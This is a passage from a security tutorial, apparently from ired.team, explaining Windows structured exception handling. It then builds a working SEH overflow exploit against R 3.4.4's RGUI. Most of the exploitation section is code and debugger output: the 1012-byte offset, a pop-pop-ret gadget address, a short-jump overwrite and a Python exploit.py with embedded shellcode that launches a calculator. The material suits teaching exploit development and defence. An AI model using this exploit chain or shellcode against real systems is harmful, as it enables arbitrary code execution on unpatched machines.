As mentioned earlier, the first member inside the `_NT_TIB` structure is a pointer to `_EXCEPTION_REGISTRATION_RECORD` memory structure, which is the first SEH record / head of the SEH chain (linked list) and can be inspected like so:

Copy

    dt _EXCEPTION_REGISTRATION_RECORD

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeWmTwREZyQXFxEnI6w%252F-MeabLl0kVgBvQIV2ZVK%252Fimage.png%3Falt%3Dmedia%26token%3Dbbb4e445-fef7-4b38-94a4-722109b2490e&width=768&dpr=4&quality=100&sign=e6ea1cfb&sv=2)

SEH record memory structure \_EXCEPTION\_REGISTRATION\_RECORD

The first member of `_EXCEPTION_REGISTRATION_RECORD` is a pointer to the next SEH record and the second member is a pointer to the exception handler that is defined in the `_EXCEPTION_DISPOSITION` memory structure.

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#actual-memory-structures)

Actual Memory Structures

We've learned about a couple of key memory structures, but now let's see how those structures look like when inspecting a real program that has some SEH records defined.

As noted earlier, SEH are the `try` / `catch` code blocks in the program as shown below:

seh-overflow.c

Copy

    int main(int argc, char* argv[]) 
    {
        try
        {
            throw 1;
        }
        catch (int e)
        {
            
        }
    
        return 0;
    }

Let's compile the above program as seh-overflow.exe and inspect it with WinDBG again, this time with a `!teb` command:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeWmTwREZyQXFxEnI6w%252F-MeaeQI2jTAayNycDihB%252Fimage.png%3Falt%3Dmedia%26token%3D80f16ce6-744e-4dc8-b452-7e9c36284d02&width=768&dpr=4&quality=100&sign=c0fdd6f7&sv=2)

!teb

We can see that `_TEB` is located at `00a25000` and that the `ExceptionList` / head of the SEH chain is located at `00cff2cc`. From earlier, we said that this value could also be retrieved from the FS segment register `fs:[0]`, so let's confirm that:

Copy

    dd fs:[0] L1

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeWmTwREZyQXFxEnI6w%252F-MeajO4GhOS1JWE0i-wB%252Fimage.png%3Falt%3Dmedia%26token%3Dd81c0212-e966-42f9-96b7-029182fbc339&width=768&dpr=4&quality=100&sign=24624582&sv=2)

Head of SEH chain retrieved from the FS segment register fs:\[0\]

Let's check the start of the SEH chain at `00cff2cc` like so:

Copy

    dt _EXCEPTION_REGISTRATION_RECORD 00cff2cc

From this point the`ExceptionList` address changed from `00cff2cc` to `00cff274` due to the deugging program being restarted. This may happen multiple time throughout the labs.

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeqChNRAcL3eGo5oHMV%252F-Met6hhX-U9dWeS4Pl0i%252Fimage.png%3Falt%3Dmedia%26token%3D95fc753e-7b0d-472a-b17e-7d48954e18b3&width=768&dpr=4&quality=100&sign=904e986f&sv=2)

Start of the SEH chain at 00cff274

Below gif demonstrates how we can get the address of the head of the SEH chain with `!teb` command and by inspecting the `ExceptionList`. We can then walk through all the registered SEH records in the SEH chain and observe how the last SEH record indicates that the next SEH records is at `0xffffffff`: (meaning, it is actually the last record and there's no next SEH record in the chain):

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeWmTwREZyQXFxEnI6w%252F-MeaqS6Mo72-f8uwHjhy%252Fteb-seh-chain.gif%3Falt%3Dmedia%26token%3Dd8f1a21e-207a-4250-be1c-c27ef3d94f18&width=768&dpr=4&quality=100&sign=b27cb40b&sv=2)

Walking through the SEH chain in WinDBG

Note, however, that these SEH records are the exception handlers defined in the ntdll and not in our compiled binary:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeqChNRAcL3eGo5oHMV%252F-MetA5dbcoRDfjcPfo7R%252Fimage.png%3Falt%3Dmedia%26token%3Dde5bbc47-fe6a-4cb2-a96f-c8806d0983dc&width=768&dpr=4&quality=100&sign=ffc5ce8d&sv=2)

In order to see the SEH records defined by our program, we need it to execute the `try` / `catch` code block that we have in the `main()` function. Let's see the CPU instructions at our program's entry point:

Copy

    u $exentry

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeqChNRAcL3eGo5oHMV%252F-MetCdwTc-7G-fPcK6mk%252Fimage.png%3Falt%3Dmedia%26token%3Da6794f3c-551f-4e4f-9cb2-7411296f3d7f&width=768&dpr=4&quality=100&sign=25b58449&sv=2)

A bunch of jmp instructions in our seh-overflow.exe entry point

At this point, I do not know what the deal is with all the jmps, but let's try setting a breakpoint at `00e1911d` (2nd `jmp` instruction), right after the first `jmp` at `00e19118` and continue with execution:

Copy

    bp $exentry + 5
    g

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeqChNRAcL3eGo5oHMV%252F-MetGC1PlQE2lf5IClBd%252Fimage.png%3Falt%3Dmedia%26token%3De9869dd7-5eb0-4c5c-952f-c5ca243842d5&width=768&dpr=4&quality=100&sign=ac385be&sv=2)

Breakpoint hit at the Image Entry

Let's now see where the SEH head is at:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeqChNRAcL3eGo5oHMV%252F-MetGUuKpcqoBhiZRBOS%252Fimage.png%3Falt%3Dmedia%26token%3Db310b6b9-1ffb-4a3c-8b49-b73c8e63b814&width=768&dpr=4&quality=100&sign=98e9b329&sv=2)

SEH chain starts at 00bbfb2c

We can now see that the start of the SEH chain has changed and is at `00bbfb2c`, so let's check the first SEH record:

Copy

    dt _EXCEPTION_REGISTRATION_RECORD 00bbfb2c

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeqChNRAcL3eGo5oHMV%252F-MetGvwxj__nBLXgCap6%252Fimage.png%3Falt%3Dmedia%26token%3D82d5d5e1-bbe8-459b-bb0b-5839ae85dedd&width=768&dpr=4&quality=100&sign=a3b5abd2&sv=2)

The exception handler for the first SEH record is at `0x00e220f0`. Let's see which module it belongs to:

Copy

    u 0x00e220f0

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeqChNRAcL3eGo5oHMV%252F-MetHB2njBm3UYRyFAHW%252Fimage.png%3Falt%3Dmedia%26token%3Df87d1973-6e2e-4736-803b-79004ffa3464&width=768&dpr=4&quality=100&sign=ae2d31dc&sv=2)

0x00e220f0 is the 1st exception handler of seh-overflow.exe

The above image confirms that `0x00e220f0` is inside our seh-overflow.exe image and we're inspecting the SEH chain from our seh-overflow.exe.

WinDBG has a command to explore SEH chains `!exchain`:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MfSUGGvtRNC7WOVCmJV%252F-MfSUzWx-A0MDxdg5nsw%252Fimage.png%3Falt%3Dmedia%26token%3D38061fdc-ee01-4a03-a23a-83700b98969d&width=768&dpr=4&quality=100&sign=6804eaf2&sv=2)

We can also easily discover SEH records using xdbg by inspecting the SEH tab as shown below:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeqChNRAcL3eGo5oHMV%252F-MetIABC4-ilE5wSzoL0%252Fimage.png%3Falt%3Dmedia%26token%3Da1bd029a-f594-450e-9816-04480a50aaac&width=768&dpr=4&quality=100&sign=c212ea0b&sv=2)

Inspecting SEH chains using xdbg

Below shows how SEH records 1 to 4 (right) are organized on the program's stack (left):

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetIb4YOKJwVcbA7U-s%252F-MetUfXSQGDbAouOGIE2%252Fimage.png%3Falt%3Dmedia%26token%3Decaa0445-d57d-414b-b9c3-af495619df80&width=768&dpr=4&quality=100&sign=f2008ac2&sv=2)

SEH chain on the stack

If we updated our very first diagram showing where SEH chain is located and how it looks like with actual memory addresses, it would now look like this:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetIb4YOKJwVcbA7U-s%252F-MetUnfXFXloFezGudbV%252Fimage.png%3Falt%3Dmedia%26token%3Dc379b1ae-14ed-4917-afbe-2aad292bb29e&width=768&dpr=4&quality=100&sign=4d48efeb&sv=2)

TEB / TIB / SEH chain with actual memory addresses

Note that the exception handler at `0x00e220f0`, when we identified it previously using WinDbg after executing the first `jmp` inside the seh-overflow.exe entry point, was the first SEH record in the chain, however, inspecting the SEH chain in xdbg, we can see that the handler `0x00e220f0` actually belongs to the second SEH record, which suggests that executing the first `jmp` was not enough to set up the full SEH chain. That, however, does not prevent us from moving this lab further into the exploitation phase, but it's just something to note if you're playing along.

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#exploiting-seh-overflow)

Exploiting SEH Overflow


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#intro)

Intro

We're going to be exploiting the [R 3.4.4](https://www.exploit-db.com/exploits/47122)
 on a 32-bit Windows 10 system.

The following exploitation steps will not be detailed, since they can be found in my other notes:

*   Identifying the SEH record overwrite offset - see [Finding EIP offset](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow#finding-eip-offset)
    ;
    
*   Identifying bad characters for the shellcode - see [Finding bad characters](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow#finding-bad-characters)
    .
    

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#confirming-the-crash)

Confirming the Crash

Let's open RGUI.exe in xdbg and hit F9 as many times as we need in order to get the program's GUI to show up:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetYG5dS9mZeA5-98jl%252F-MetaFNSVlBrgPfYDJUH%252Fimage.png%3Falt%3Dmedia%26token%3Dd3401f74-1b48-41bf-8c29-d61b40f56607&width=768&dpr=4&quality=100&sign=99c11410&sv=2)

RGUI showing up after launching it via xdbg

Let's generate some garbage data that we will send to the RGUI in order to confirm we can crash it:

Copy

    python -c "print('A'*3000)" | clip.exe

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetYG5dS9mZeA5-98jl%252F-Metdqyr3QddkEkcOPs6%252Fimage.png%3Falt%3Dmedia%26token%3Db66269ac-631c-4d06-a780-d12ebe5661e4&width=768&dpr=4&quality=100&sign=1bed6a1b&sv=2)

Generating garbage data using python

Open the RGUI configuration editor and paste the garbage data generated into the "Language for menus and messages" input box as shown and click OK and then OK once more:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetYG5dS9mZeA5-98jl%252F-Metgz4m--HdfONSzu-j%252Fcrashing-rgui.gif%3Falt%3Dmedia%26token%3D79743f6b-aeb8-4bb7-af80-6e07c0aa5335&width=768&dpr=4&quality=100&sign=d1f4e78f&sv=2)

Sending garbage data to RGUI to confirm we can crash it and check if it's vulnerable to overflows

At this point, looking at xdbg, we can confirm the program crashed and is vulnerable to a classic buffer overflow as we were able to overwrite the EIP register with our AAAA (0x41414141):

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetYG5dS9mZeA5-98jl%252F-Methdd7z34BaFqin1YC%252Fimage.png%3Falt%3Dmedia%26token%3D2b0892f3-6963-4dd8-b2ee-f340c226b161&width=768&dpr=4&quality=100&sign=613640b3&sv=2)

Program is vulnerable to a classic buffer overflow - EIP is overwritten

More, importantly, however, we confirm that the program is also vulnerable to the SEH overflow by inspecting the SEH chain tab:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetYG5dS9mZeA5-98jl%252F-Meti4QwTjBkUC0nRQ3H%252Fimage.png%3Falt%3Dmedia%26token%3D4f016047-cd47-4414-886b-91d69c7913d6&width=768&dpr=4&quality=100&sign=d2c8f65c&sv=2)

Program confirmed to be vulnerable to SEH overflow - SEH record is overwrriten

Note from above screenshot that the first SEH record was overwritten in the following manner:

*   SEH record's handler address was overwritten (red);
    
*   Pointer to the next SEH record was also overwritten (green).
    

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#confirming-seh-record-offset)

Confirming SEH Record Offset

As the next step, we need to find an offset at which we can overwrite the SEH record.

When a user supplied input is sent to a program vulnerable with a buffer overflow vulnerability, the stack is overwritten from lower memory addresses towards higher memory addresses.

We also know that SEH records are stored on the stack and each one is an 8 byte memory structure that contains:

1.  Pointer to the next SEH record;
    
2.  Exception handler for the current SEH record.
    

Based on the above, in order to confirm the SEH record offset, we should generate a dummy payload that is structured like so:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetYG5dS9mZeA5-98jl%252F-Mett5XnkEGSjnnNeHjb%252Fimage.png%3Falt%3Dmedia%26token%3Df5c7480d-b790-421a-9a61-a82cf3a1fba6&width=768&dpr=4&quality=100&sign=be51664f&sv=2)

Payload structure high level view

Following the [Finding EIP offset](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow#finding-eip-offset)
 technique, we identity that the SEH record offset into the stack is `1012`.

Based on all of the above, our payload for testing, if we can correctly overwrite the SEH record (its pointer to the next SEH record and current SEH record's handler), should now look like this:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-MeujwMT3bE3Me9eOQld%252Fimage.png%3Falt%3Dmedia%26token%3Dfb8753f4-a498-44bf-ab20-3fc4daa8ed7d&width=768&dpr=4&quality=100&sign=baedd517&sv=2)

Payload structure with offset to the SEH record

Let's create the above payload:

Copy

    python -c "print('A'*1012 + 'BBBB' + 'CCCC')" | clip.exe

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetYG5dS9mZeA5-98jl%252F-MetsoMpyCV5XOSoKaqA%252Fimage.png%3Falt%3Dmedia%26token%3D1eedfd27-ee2d-4830-bb4a-7c1f09031535&width=768&dpr=4&quality=100&sign=895bb701&sv=2)

...and send it to the vulnerable program and see if we can overwrite the SEH record, located at `0141e768` correctly:

**Important**

Note the SEH record address `0141e768` - this is the record we will be overwriting and it will become very important when trying to understand how to force the vulnerable program to jump to our shellcode.

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MetYG5dS9mZeA5-98jl%252F-MettDLiGgjZITKKqq_L%252Fimage.png%3Falt%3Dmedia%26token%3D9c4416b1-a10a-4554-87d8-eb496dc1cbb8&width=768&dpr=4&quality=100&sign=f6df428d&sv=2)

Confirming we can overwrite SEH record at 0141e768

From the above screenshote we can see that we can overwrite the SEH record correctly:

*   43434343 (CCCC) is the exception handler for the current SEH record;
    
*   42424242 (BBBB) is the address of the next SEH record;
    

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#pop-pop-ret)

POP POP RET

Next, we will need to find a memory address in the vulnerable program that contains `pop pop ret` gadget. Let's see why we need this ROP gadget - hint: so that we can jump to the next SEH record in the chain, that we in fact can control, from which we can jump to the shellcode.

Useful notes about ROP gadgets:

[ROP Chaining: Return Oriented Programming](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming)

Let's send `1012*A` to the vulnerable program and upon crashing it, inspect the SEH chain:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mey6XH8t3EcJt7kvpqX%252F-MfSOEn1dGDY_Ns1bFx4%252Fimage.png%3Falt%3Dmedia%26token%3Dbf793ba1-1513-4e91-9edb-392bc8cfaaf8&width=768&dpr=4&quality=100&sign=eedfcdad&sv=2)

SEH chain at time of the crash

Note the first SEH record is at address `0141E768` and its handler is at `76275680`.

Again, it is important to remember / realize that we control/can overwrite the SEH record at `0141e768`.

Let's set a breakpoint on the handler at `76275680`, continue execution until that breakpoint is hit, then inspect the SEH chain and the stack's contents:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-MeuFWqRkGrL9maBe09M%252Fimage.png%3Falt%3Dmedia%26token%3D1969c42d-5c1e-492a-8093-394a70ea2314&width=768&dpr=4&quality=100&sign=c65f6f7a&sv=2)

Breakopoint hit at 76275680. 0141E768 is the SEH record we control and it's 3 values below the top of the stack

Once the breakpoint is hit at `76275680`, we can see that the address `0141E768`, which is the address of the next SEH record (which we control) is on the stack and it's just 3 values below the top of the stack. This means that if we could overwrite the current SEH record's `0141E768` handler, currently pointing to `76275680`, to a memory address that contains `pop pop ret` instructions, we could transfer the program's execution control to `0141E768` (a SEH record that we control) and from there, execute our shellcode. We will test this in a moment.

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#finding-pop-pop-ret)

Finding POP POP RET

To find memory addresses containing `pop pop ret` instructions, we can search all modules for a bytes pattern `5f 5d c3` that translates to `pop edi; pop ebp; ret`:

Any other byte pattern that translates to `pop pop ret` should work too.

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-MeuLbqyyvTzJoNWu0mM%252Fimage.png%3Falt%3Dmedia%26token%3Dbec2a25f-9563-4d13-880c-25e5fc34e080&width=768&dpr=4&quality=100&sign=b62acc6e&sv=2)

Finding pop pop ret instructions using byte pattern search in all modules

There are multiple results found as shown below. Let's chose the first one that contains executable instructions at `0x637412c8` and set a breakpoint on it by hitting F2:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-MeuMKw9GiVnt_iVozgT%252Fimage.png%3Falt%3Dmedia%26token%3De98258ff-95f8-4691-a8ef-a4c223ce9212&width=768&dpr=4&quality=100&sign=f30c44ce&sv=2)

Breakpoint is set at 0x637412c8, it contains pop pop ret instructions

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#overwriting-seh-record-and-subverting-code-execution-flow)

Overwriting SEH Record and Subverting Code Execution Flow

We now know that our payload should look like this:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MfSUGGvtRNC7WOVCmJV%252F-MfS_WtH5rsBzhj-HMsR%252Fimage.png%3Falt%3Dmedia%26token%3Dfd32d0f3-5995-4446-9ba8-b6e400209683&width=768&dpr=4&quality=100&sign=7244cc71&sv=2)

So wen can start building our python exploit skeleton as shown below:

exploit.py

Copy

    f = open("payload.txt", "wb")
    
    # Offset into the first SEH record
    payload = b"A" * 1012
    
    # Address of the next SEH record
    payload += b"BOOM"
    
    # Current SEH handler (pop pop ret)
    payload += b"\xc8\x12\x94\x63"
    
    f.write(payload)
    f.close()

Executing `exploit.py` will create `payload.txt` with our payload, which when sent to the RGUI, will overflow the SEH record and overwrite it in the following way:

1.  The next SEH record will contain the bytes `42 4F 4F 4D`, representing the string `BOOM`;
    
2.  The current SEH handler will point to `0x637412c8` that contains `pop pop ret` instructions.
    

Below shows the `payload.txt` file contents:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-MeuS8-9UyDmskKg-CET%252Fimage.png%3Falt%3Dmedia%26token%3Da2bd69c1-0a6c-40ee-809c-434dcb0f4f2a&width=768&dpr=4&quality=100&sign=c8895d02&sv=2)

Payload.txt contents

Let's send that payload to the RGUI:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-MeuUN-zb_aYicEyWzi7%252Foverwriting-seh-record-1.gif%3Falt%3Dmedia%26token%3D31fe5f38-c13a-4eac-9439-9fbe8d4c405a&width=768&dpr=4&quality=100&sign=630fe4d7&sv=2)

Confirming we can subvert program's execution flow by overwriting SEH record

Note from the above gif the key points:

*   Once the program crashes with an exception and we continue running the program (F9), we hit our breakpoint at `0x637412c8` that contains the `pop pop ret` instructions;
    
*   Once `pop pop` instructions are executed, `ret` instruction pops off the top topmost value`0141E768` from the stack, which is the SEH record we control, and jumps to it;
    
*   Once execution jumps to `0141E768`, we see that first four instructions are actually are the bytes `42 4f 4f 4d` that represent our string `BOOM`, which means that at this point we have subverted the code execution flow and can start thinking about executing our shellcode.
    

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#adding-shellcode)

Adding Shellcode

We're now ready to start suplementing our payload with shellcode. Our payload should now look like this:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MfSUGGvtRNC7WOVCmJV%252F-MfSaNAITekf8y0Nn5bt%252Fimage.png%3Falt%3Dmedia%26token%3D07a77492-05a1-4d5a-b7b6-07519d0a55cd&width=768&dpr=4&quality=100&sign=5b734a5&sv=2)

Let's modify our exploit skeleton to include some shellcode that pops a calculator:

exploit.py

Copy

    f = open("payload.txt", "wb")
    
    # Offset into the first SEH record
    payload = b"A" * 1012
    
    # Address of the next SEH record
    payload += b"BOOM"
    # payload += b"\xeb\x0B\x90\x90"
    
    # Current SEH handler (pop pop ret)
    payload += b"\xc8\x12\x94\x63"
    
    # NOP sled for reliability
    payload += b"\x90"*10
    
    # shellcode
    buf = b""
    buf += b"\xba\xbf\xaf\x65\x1b\xd9\xc4\xd9\x74\x24\xf4\x5d\x31"
    buf += b"\xc9\xb1\x31\x31\x55\x13\x83\xed\xfc\x03\x55\xb0\x4d"
    buf += b"\x90\xe7\x26\x13\x5b\x18\xb6\x74\xd5\xfd\x87\xb4\x81"
    buf += b"\x76\xb7\x04\xc1\xdb\x3b\xee\x87\xcf\xc8\x82\x0f\xff"
    buf += b"\x79\x28\x76\xce\x7a\x01\x4a\x51\xf8\x58\x9f\xb1\xc1"
    buf += b"\x92\xd2\xb0\x06\xce\x1f\xe0\xdf\x84\xb2\x15\x54\xd0"
    buf += b"\x0e\x9d\x26\xf4\x16\x42\xfe\xf7\x37\xd5\x75\xae\x97"
    buf += b"\xd7\x5a\xda\x91\xcf\xbf\xe7\x68\x7b\x0b\x93\x6a\xad"
    buf += b"\x42\x5c\xc0\x90\x6b\xaf\x18\xd4\x4b\x50\x6f\x2c\xa8"
    buf += b"\xed\x68\xeb\xd3\x29\xfc\xe8\x73\xb9\xa6\xd4\x82\x6e"
    buf += b"\x30\x9e\x88\xdb\x36\xf8\x8c\xda\x9b\x72\xa8\x57\x1a"
    buf += b"\x55\x39\x23\x39\x71\x62\xf7\x20\x20\xce\x56\x5c\x32"
    buf += b"\xb1\x07\xf8\x38\x5f\x53\x71\x63\x35\xa2\x07\x19\x7b"
    buf += b"\xa4\x17\x22\x2b\xcd\x26\xa9\xa4\x8a\xb6\x78\x81\x65"
    buf += b"\xfd\x21\xa3\xed\x58\xb0\xf6\x73\x5b\x6e\x34\x8a\xd8"
    buf += b"\x9b\xc4\x69\xc0\xe9\xc1\x36\x46\x01\xbb\x27\x23\x25"
    buf += b"\x68\x47\x66\x46\xef\xdb\xea\xa7\x8a\x5b\x88\xb7"
    payload += buf
    
    f.write(payload)
    f.close()

...and send it to RGUI. Observe the crash, continue running the program until the breakpoint at `0x637412c8` is hit and inspect the memory at `0141E768`, where our SEH record, that we've just overflowed, lives. This is where we will jump to after the `pop pop ret` instructions will complete at `0x637412c8`:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-MeuaJuZylNf2C53jXpa%252Fimage.png%3Falt%3Dmedia%26token%3Df43b5608-9374-4711-80d5-b5d342959ebe&width=768&dpr=4&quality=100&sign=a1c81f1&sv=2)

Payload is organized in program's memory

From the above screenshot, we can derive the following key point - once we land on `0141E768` (red zone), which contains the 4 bytes representing our string `BOOM`, we need to jump over to our shellcode in the blue zone.

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#jumping-over-to-shellcode)

Jumping Over to Shellcode

We need to replace the `BOOM` string in our exploit code (which represents the address of the next SEH record) with a simple relative short `jmp` instruction that jumps 6 bytes further into the code. The instuction can be encoded using the following bytes `eb 06`. Additionally, since the `jmp` instruction is only 2 bytes, we'd need to supplement it with 2 NOP bytes to ensure the exploit reliability. So, `BOOM` should be replaced with bytes `eb 06 90 90` like so:

Copy

    # payload += b"BOOM"
    payload += b"\xeb\x06\x90\x90"

Note that even though we say we're jumping over 6 bytes into the code, but in fact, we are jumping over 8 bytes, because the `jmp` instruction itself is 2 bytes, so therefore 2+6=8. Essentially, we are jumping over the SEH record itself after which our shellcode lives.

Our payload visually should now look like this:

